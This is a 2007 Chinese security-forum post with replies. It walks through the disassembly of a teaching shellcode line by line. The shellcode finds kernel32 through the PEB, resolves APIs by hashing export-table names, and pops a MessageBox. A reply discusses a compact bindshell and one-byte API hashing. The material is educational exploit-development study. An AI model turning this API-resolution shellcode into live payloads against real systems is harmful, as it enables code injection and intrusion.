
# 完全分析 failwest Sir's Shellcode

> 原文：[`www.pediy.com/kssd/pediy09/pediy09-352.htm`](https://www.pediy.com/kssd/pediy09/pediy09-352.htm)

> 【文章标题】: 完全分析 failwest Sir's Shellcode
> 【文章作者】: fqucuo
> 【作者邮箱】: fqucuo@163.com
> 【作者 QQ 号】: 389990968
> 【下载地址】: 自己搜索下载
> 【使用工具】: OD

> --------------------------------------------------------------------------------

## 【详细过程】

这个 Shellcode 是 failwest Sir 在第 7 讲中列出来的，如有需要，自己去下。

相信很多菜鸟跟我一样，第一次接触 shellcode，确已经被 failwest Sir 的几篇短小精悍的文章所吸引，并入了门，但是前方的路还是很长，其中也是 failwest Sir 提到的那 5 个问题，其中第 1 个和第 5 个我相信如果是勤奋的"黑客"，多加思考很快就可以出答案的，今天，也就是 failwest Sir 的 Shellcode 主要是解决了第 2 和第 3 个问题：如果布置缓冲区和动态获取 API。

其实分析此 Shellcode 也是因为我在动态获取 API 这块有所迷茫，第一次分析 failwest Sir 的 shellcode 也是一头雾水，并且自己用遍历法实现了动态获取 API 的过程，但是其代码量极其可观，而一个过长的 shellcode 哪怕再通用与稳定也是废品，在百思不得其解的时候又回过头决定硬是要吧 failwest Sir 的这段短小精悍的 Shellcode 研究明白，这也是此文的目的：对于和我一样迷茫在这两个问题之间的菜鸟们，对于已经理解的就不需要继续看下去了。

Ok，废话不多说了，我们还是先来看 code 吧！

首先自己随便写个程序把 shellcode 加载进去，再次这段加载过程不予叙述（什么？不会？你先把 failwest Sir 的前 6 讲看懂了再来！），还有就是这段代码汇编难度不是很高，大部分地方我都有注释，看懂应该不难

那么我们就直接走到这段 shellcode 的起始地址

```
0012FF34    FC              cld                                                                                                                     ; 置串操作方向标志为 0，也就是递增方式
0012FF35    68 6A0A381E     push    1E380A6A                          ; 放入 3 个加密过的函数名 暂时不管
0012FF3A    68 6389D14F     push    4FD18963
0012FF3F    68 3274910C     push    0C917432
```
这 3 个 4 字节的 `push` 的一开始我也不清楚，估计大家也都不清楚，没关系，后面我们就知道它是做什么用的了

```
0012FF44    8BF4            mov     esi, esp                          ; esi 保存函数名字符串首地址
0012FF46    8D7E F4         lea     edi, dword ptr [esi-C]            ; ?
```
因为 `esi` 保存了 `esp` 的地址，再-0xC 也就是栈顶往上 0xC 个字节,其实是用来存放上面 3 个函数名的函数指针（地址）

```
0012FF49    33DB            xor     ebx, ebx
0012FF4B    B7 04           mov     bh, 4
0012FF4D    2BE3            sub     esp, ebx                           ; 调整 esp 栈顶
```
这部分就是布置缓冲区的操作，将 `esp` - 0x0400，也就是将栈顶向上调整 400 字节，哈哈，够用了吧！，

```
0012FF4F    66:BB 3332      mov     bx, 3233
0012FF53    53              push    ebx
0012FF54    68 75736572     push    72657375                          ; user32
```
`push` 了一个 `user32` 字符串编码

```
0012FF59    54              push    esp                               ; user32 作为 LoadLibrary 参数压栈
```
`push` 了 `user32` 字符串的首地址

```
0012FF5A    33D2            xor     edx, edx
0012FF5C    64:8B5A 30      mov     ebx, dword ptr fs:[edx+30]                 ;得到 PEB 首地址
0012FF60    8B4B 0C         mov     ecx, dword ptr [ebx+C]                           ; 得到 LDT
0012FF63    8B49 1C         mov     ecx, dword ptr [ecx+1C]
0012FF66    8B09            mov     ecx, dword ptr [ecx]
0012FF68    8B69 08         mov     ebp, dword ptr [ecx+8]           ; 找到 Kernel32 的首地址
```
这一部分有必要解释一下，我们都知道要获取 API 就要先找到 `LoadLibrary`，（我是喜欢先找 `GetProcAddress`，因为有了他，嘿嘿！不过原文中是用来做例子的，其例子效果大家调试后就知道是个 `MessageBox`，并显出 failwest Sir 的大名，然后程序退出，不过到了真实的战场，估计不会让目标进程 Over 吧？），而要找到 `LoadLibrary` 就要先找到 `kernel32` 在目标进程的基地址，其实解决方案也挺多了，我知道的两种：1. 遍历法，通过一个找一个程序中调用的 kernel 内部函数的地址，然后向低地址遍历，通过分析 PE 的方式去找就完事了（具体方法不属于本范围内容，估不予实现）2，也就是 failwest Sir 的方式，通过 `PEB` 找到 `Kernel32` 的加载地址（第 2 种是我抄 failwest Sir 的，(*^__^*) 嘻嘻……）。

我们知道 `fs:[0]`指向的是 `TEB`（线程环境块），`fs:[30]`指向的是（进程环境块），在进程环境块中其第 0xC 的位置存放置一个指向 `PEB_LDT_DATA` 结构的 Pointer，这个 Pointer 又指向一个 `_LDR_MODULE` 的结构，在这个结构里的第 0x1C 位置就是 `EntryPoint`，而这个 `EntryPoint` 就是 `Kernel32` 的加载地址！

为了解释这个方法，我决定先转载部分内容（因为是复制的，网站关了网址也忘了，哎~，如果那位仁兄看到了别骂我啊！）

```
strcut PEB_LDT_DATA
+0x00c Ldr              : Ptr32 to struct _PEB_LDR_DATA, 7 elements, 0x28 bytes
        +0x000 Length           : Uint4B
        +0x004 Initialized      : UChar
        +0x008 SsHandle         : Ptr32 to Void
        +0x00c InLoadOrderModuleList : struct _LIST_ENTRY, 2 elements, 0x8 bytes
           +0x000 Flink            : Ptr32 to struct _LIST_ENTRY, 2 elements, 0x8 bytes
           +0x004 Blink            : Ptr32 to struct _LIST_ENTRY, 2 elements, 0x8 bytes
        +0x014 InMemoryOrderModuleList : struct _LIST_ENTRY, 2 elements, 0x8 bytes
           +0x000 Flink            : Ptr32 to struct _LIST_ENTRY, 2 elements, 0x8 bytes
           +0x004 Blink            : Ptr32 to struct _LIST_ENTRY, 2 elements, 0x8 bytes
        +0x01c InInitializationOrderModuleList : struct _LIST_ENTRY, 2 elements, 0x8 bytes
           +0x000 Flink            : Ptr32 to struct _LIST_ENTRY, 2 elements, 0x8 bytes
           +0x004 Blink            : Ptr32 to struct _LIST_ENTRY, 2 elements, 0x8 bytes
        +0x024 EntryInProgress : Ptr32 to Void
```

未公开的 `LDR_MODULE` 数据结构如下：

```
typedef struct _LDR_MODULE
{
    LIST_ENTRY        InLoadOrderModuleList;            // +0x00
    LIST_ENTRY        InMemoryOrderModuleList;          // +0x08
    LIST_ENTRY        InInitializationOrderModuleList;  // +0x10
    PVOID             BaseAddress;                      // +0x18
    PVOID             EntryPoint;                       // +0x1c  
    ULONG             SizeOfImage;                      // +0x20
    UNICODE_STRING    FullDllName;                      // +0x24
    UNICODE_STRING    BaseDllName;                      // +0x2c
    ULONG             Flags;                            // +0x34
    SHORT             LoadCount;                        // +0x38
    SHORT             TlsIndex;                         // +0x3a
    LIST_ENTRY        HashTableEntry;                   // +0x3c
    ULONG             TimeDateStamp;                    // +0x44
                                                          // +0x48
} LDR_MODULE, *PLDR_MODULE;
```

OK 现在我们得到了 `Kernel32` 的首地址，那下一步干什么呢？对了！就是通过解析 PE 的方式去找我们的需要的导出函数。

```
0012FF6B    AD              lods    dword ptr [esi]                  ; 忘了吗？esi 保存着函数名字符串首地址呢，取 4 字节加密过的函数名到 eax 中，esi 递增 4，当然了，在本例中为了实现 MessageBox 肯定是先找 LoadLibrary 了
0012FF6C    3D 6A0A381E     cmp     eax, 1E380A6A                    ; 与加过密 MessageBoxA 做比较
0012FF71    75 05           jnz     short 0012FF78
0012FF73    95              xchg    eax, ebp                                                       ；技巧性指令，通过一个 xchg 一个字节的指令完成两【寄存器值】交换
0012FF74    FF57 F8         call    dword ptr [edi-8]                ; 这里为什么要-8，那是因为作者将 3 个加密过的函数字符串按照先 LoadLibrary 的顺序，第 3 个又是 1E380A6A,当到了第 3 个的时候，就会去调 LoadLibrary,因为那个时候已经得到了 LoadLibrary 的函数指针，也就得到了 user32 的首地址
0012FF77    95              xchg    eax, ebp
```

这里开始就是解析 PE 了，其顺序是 `NT_HEADER` ->  导出表地址 -> 导出表结构地址 -> 得到导出表函数名数组首地址 -> 遍历数组并取数组内容 + KernelBase 的字符串内容通过加密得到最终的 4 字节数据与我们的 `LoadLibrary`（0C917432）比较，找到了就跳出来，这个时候我们也得到了其数组的下标

```
0012FF78    60              pushad
0012FF79    8B45 3C         mov     eax, dword ptr [ebp+3C]          ; 1. m_elfnew PE 头偏移
0012FF7C    8B4C05 78       mov     ecx, dword ptr [ebp+eax+78]      ; 2. 导出表数据目录偏移
0012FF80    03CD            add     ecx, ebp                         ; 3. RVA + Base
0012FF82    8B59 20         mov     ebx, dword ptr [ecx+20]          ; 4. EXPOT_DIRECTORY 中的 AddressOfNames
0012FF85    03DD            add     ebx, ebp                         ;     RVA + Base
0012FF87    33FF            xor     edi, edi
0012FF89    47              inc     edi                              ; 5. 计数器（用来取索引值的）置 1
0012FF8A    8B34BB          mov     esi, dword ptr [ebx+edi*4]       ; 取得函数名 RVA
0012FF8D    03F5            add     esi, ebp                         ; RVA + Base
```



> 0012FF8F 99 cdq ; 技巧性指令，当 `eax` >=0 or `eax` <0x8000000 时，`edx` 清零  
> 0012FF90 0FBE06 movsx eax, byte ptr [esi]  
> 0012FF93 3AC4 cmp al, ah ; 每次取一个字节，遇 0 结束  
> 0012FF95 74 08 je short 0012FF9F  
> 0012FF97 C1CA 07 ror edx, 7  
> 0012FF9A 03D0 add edx, eax  
> 0012FF9C 46 inc esi  
> 0012FF9D ^ EB F1 jmp short 0012FF90  
> 0012FF9F 3B5424 1C cmp edx, dword ptr [esp+1C] ; 比较是否等于我们的加密过的函数值  
> 0012FFA3 ^ 75 E4 jnz short 0012FF89  

这里通过刚才得到的下标转换成索引去找对应函数的 RVA，找到后再加上 KernelBase 就是我们需要的函数指针了

> 0012FFA5 8B59 24 mov ebx, dword ptr [ecx+24] ; 取 AddressOfNameOrdinals  
> 0012FFA8 03DD add ebx, ebp ; RVA + Base  
> 0012FFAA 66:8B3C7B mov di, word ptr [ebx+edi*2] ; 通过计数器值转换对应函数的索引值  
> 0012FFAE 8B59 1C mov ebx, dword ptr [ecx+1C] ; 取 AddrssOfFunctions  
> 0012FFB1 03DD add ebx, ebp ; RVA + Base  
> 0012FFB3 032CBB add ebp, dword ptr [ebx+edi*4] ; ebp 得到函数指针（也就是函数地址）  
> 0012FFB6 95 xchg eax, ebp  
> 0012FFB7 5F pop edi  
> 0012FFB8 AB stos dword ptr es:[edi] ; 存放函数指针  
> 0012FFB9 57 push edi ; 因为 stos 执行会使 edi 自加，所以这个时候 edi 跑到了下 4 个字节首地址，而 3 个指令仅仅只有 3 个字节的大小！强！  
> 0012FFBA 61 popad  

> 0012FFBB 3D 6A0A381E cmp eax, 1E380A6A  
> 0012FFC0 ^ 75 A9 jnz short 0012FF6B  
这里算是整个遍历的结尾，具体细节请参考罗云彬《Windows 环境下 32 位汇编语言程序设计（第 2 版）》P678，这里就不做解释了

大概的思路就是：因为我们只有函数名，所以不能直接通过索引取函数 RVA，要先遍历函数名数组中的各成员，看谁能配对，找到了就记下当时的下标，在把下标通过 `AddressOfNameOrdinals` 转换成函数索引，在从 `AddressOfFunctions` 中取该索引的 RVA，再加上 `KernelBase` 就得到对应 API 的地址，然后再存放入先前的 `edi` 地址中。然后比较是否是 `MessageBox` 不是的话再回到上面继续去找

这个地方熟悉吗？ 哈哈，跟过前面几个教程的一定对这里很眼熟，对了，就是弹出 failwest Sir 的大名对话框，哈，failwest Sir 的劣根还真深 啊。。

> 0012FFC2 33DB xor ebx, ebx  
> 0012FFC4 53 push ebx  
> 0012FFC5 68 77657374 push 74736577  
> 0012FFCA 68 6661696C push 6C696166  
> 0012FFCF 8BC4 mov eax, esp  
> 0012FFD1 53 push ebx  
> 0012FFD2 50 push eax  
> 0012FFD3 50 push eax  
> 0012FFD4 53 push ebx  
> 0012FFD5 FF57 FC call dword ptr [edi-4]  
> 0012FFD8 53 push ebx  
> 0012FFD9 FF57 F8 call dword ptr [edi-8]  

整体分析就这么多了，相信通过这么多注释看懂应该不是问题了，当然有些不正确的地方还望过路人不吝赐教。

结尾再说几句，通过分析这段 Shellcode，我们不难看出，一个良好的 Shellcode 应该具有的品质：短小精悍（只有 168 个字节就完成动态 API 的查找任务，并且还可以查多个），扩展性（只需要简单的替换掉其中的常量加密过的值（加密过的值是不能逆推的）就 OK），通用性（这点我要说的是，文中使用到的 PEB 结构或许在 Xp 下有用，Visit 呢？不一定哦），稳定性（稳定压倒一切嘛）。。。还有什么我就不知道了

其加密方式应该是 hash 吧？ 这部分不是很懂，所以不敢妄加论言，希望有高手指点指点

代码的精简：例子中经常用到短小精悍的指令就完成了诸多任务，可以看出作者其功力之深厚（这不是废话嘛！），我相信一定也解决了大部分同志的苦恼，再次感谢 failwest Sir！

本文到此结束！

--------------------------------------------------------------------------------
【经验总结】

整体分析就这么多了，相信通过这么多注释看懂应该不是问题了，当然有些不正确的地方还望过路人不吝赐教。

结尾再说几句，通过分析这段 Shellcode，我们不难看出，一个良好的 Shellcode 应该具有的品质：短小精悍（只有 168 个字节就完成动态 API 的查找任务，并且还可以查多个），扩展性（只需要简单的替换掉其中的常量加密过的值（加密过的值是不能逆推的）就 OK），通用性（这点我要说的是，文中使用到的 PEB 结构或许在 Xp 下有用，Visit 呢？不一定哦），稳定性（稳定压倒一切嘛）。。。还有什么我就不知道了

其加密方式应该是 hash 吧？ 这部分不是很懂，所以不敢妄加论言，希望有高手指点指点

代码的精简：例子中经常用到短小精悍的指令就完成了诸多任务，可以看出作者其功力之深厚（这不是废话嘛！），我相信一定也解决了大部分同志的苦恼，再次感谢 failwest Sir！

本文到此结束！

--------------------------------------------------------------------------------
【版权声明】: 本文原创于看雪技术论坛, 转载请注明作者并保持文章的完整, 谢谢!

2007 年 12 月 26 日 12:44:04

楼主替我把《0day》中解释这段 shellcode 的章节基本贴出来了啊，呵呵

shellcode 的开发需要很多汇编技巧，不是一件容易的事。

实际上我在《0day》中我还介绍了一个 191 个字节就能够完成绑定端口，开后门的 bindshell，里边用了大量的技巧指令，就是把一个字节掰开来两半的用，又当数据又当指令。函数名的 hash 算法也是经过编程搜索最后确定的，一个字节就能 hash 出一个 API 函数名（要比较原函数名的话扳着指头算需要多少字节吧）

然而 191 字节的 shellcode（对黑客而言有用的）还并不是最短的。这种开发难度非常高，但仍然会有高手在 shellcode 中完成比较复杂的探测漏洞主机，传播代码的功能，也就是臭名昭著的蠕虫。

总之，入门之后的路还挺长，不管是安全专家还是黑客，路都不好走啊，呵呵

这次元旦的比赛很看好这位楼主啊，呵呵

引用:

* * *

*最初由 **scz**发布* (帖子 396638) >一个字节就能 hash 出一个 API 函数名

请教一下，你这句话是啥意思？

字节'A' --> somethash( 'A' ) --> API 函数名？

* * *

一个字节 8bit，能区分 256 种数据。虽然 DLL 中导出的 API 经常达到 500 个以上，但 shellcode 用到的一般也就六七个，只要保证这六，七个 API 的函数名 hash 能够与剩下的没有碰撞，一个字节的 hash 就是可行的。

如果使用异或作为 hash 算法，用什么来异或就可以通过编程搜索来实现。其实可以找到三，四个用于异或的 hash key 用来实现对 soket 函数名的单字节 hash

4dd466d0e1e0cc123afbe504da2462ca
